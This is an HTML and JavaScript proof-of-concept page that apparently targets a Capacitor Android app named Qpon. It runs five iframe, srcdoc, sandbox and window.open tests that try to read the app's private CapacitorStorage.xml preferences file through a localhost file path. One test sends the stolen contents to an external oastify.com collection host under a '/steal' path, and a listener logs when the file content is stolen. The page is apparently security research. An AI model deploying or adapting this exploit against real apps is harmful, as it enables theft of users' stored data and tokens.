<html><head><title>Qpon</title></head><body>
<pre id="log"></pre>
<script>
var L=document.getElementById("log");
function log(s){L.textContent+=s+"\n"}
log("=== iframe src + srcdoc mixing tests ===\n");

var target = "https://localhost/_capacitor_file_/data/data/com.qpon.platform/shared_prefs/CapacitorStorage.xml";

// Test 1: srcdoc with script that fetches localhost file
// srcdoc inherits parent origin — does fetch to localhost work from srcdoc?
log("--- Test 1: srcdoc fetch localhost ---");
var ifr1 = document.createElement("iframe");
ifr1.srcdoc = '<script>fetch("' + target + '").then(r=>r.text()).then(d=>{parent.postMessage({t:"srcdoc_fetch",d:d},"*")}).catch(e=>{parent.postMessage({t:"srcdoc_fetch_err",d:e.message},"*")})<\/script>';
document.body.appendChild(ifr1);

// Test 2: src loads localhost, then replace with srcdoc
// Does srcdoc inherit the iframe's PREVIOUS origin (localhost)?
log("--- Test 2: src first, then srcdoc ---");
var ifr2 = document.createElement("iframe");
ifr2.src = target;
ifr2.onload = function() {
  log("[test2] src loaded, now setting srcdoc...");
  ifr2.srcdoc = '<script>document.write("origin: "+window.origin);fetch("' + target + '").then(r=>r.text()).then(d=>{parent.postMessage({t:"src_then_srcdoc",d:d},"*")}).catch(e=>{parent.postMessage({t:"src_then_srcdoc_err",d:e.message},"*")})<\/script>';
};
document.body.appendChild(ifr2);

// Test 3: iframe src + sandbox="allow-scripts allow-same-origin"
// Does sandbox change CORS behavior?
log("--- Test 3: sandbox allow-scripts allow-same-origin ---");
var ifr3 = document.createElement("iframe");
ifr3.sandbox = "allow-scripts allow-same-origin";
ifr3.src = target;
ifr3.onload = function() {
  try {
    var doc = ifr3.contentDocument || ifr3.contentWindow.document;
    var txt = doc.documentElement ? doc.documentElement.textContent : doc.body.textContent;
    log("[test3] sandbox read: " + txt.substring(0,200));
    new Image().src = "https://qd72ei46t7kcgqvjlvqhw3c8izoqci07.oastify.com/steal?method=sandbox&d=" + encodeURIComponent(txt);
  } catch(e) {
    log("[test3] blocked: " + e.message);
  }
};
document.body.appendChild(ifr3);

// Test 4: window.open target name trick
// Open localhost in named frame, then inject via window.open javascript:
log("--- Test 4: named frame + window.open javascript: ---");
var ifr4 = document.createElement("iframe");
ifr4.name = "stealframe";
ifr4.src = target;
ifr4.onload = function() {
  try {
    window.open("javascript:void(parent.postMessage({t:'named_frame',d:document.body.textContent||document.documentElement.textContent},'*'))", "stealframe");
    log("[test4] window.open javascript: sent");
  } catch(e) {
    log("[test4] blocked: " + e.message);
  }
};
document.body.appendChild(ifr4);

// Test 5: Double iframe — srcdoc creates inner iframe to localhost
// srcdoc inherits parent origin. But what if srcdoc iframe then loads localhost in sub-iframe?
log("--- Test 5: srcdoc nested iframe ---");
var ifr5 = document.createElement("iframe");
ifr5.srcdoc = '<iframe id="inner" src="' + target + '" onload="try{var d=this.contentDocument.documentElement.textContent;parent.parent.postMessage({t:\'nested\',d:d},\'*\')}catch(e){parent.parent.postMessage({t:\'nested_err\',d:e.message},\'*\')}"></iframe>';
document.body.appendChild(ifr5);

// Listen for postMessage results from all tests
window.addEventListener("message", function(e) {
  var d = e.data;
  if(d && d.t) {
    log("\n[RESULT " + d.t + "] " + (d.d ? d.d.substring(0,300) : "empty"));
    if(d.d && d.d.length > 10 && d.d.indexOf("<?xml") >= 0) {
      log("*** FILE CONTENT STOLEN! ***");
    }
  }
});

log("\nWaiting for results...\n");
</script></body></html>
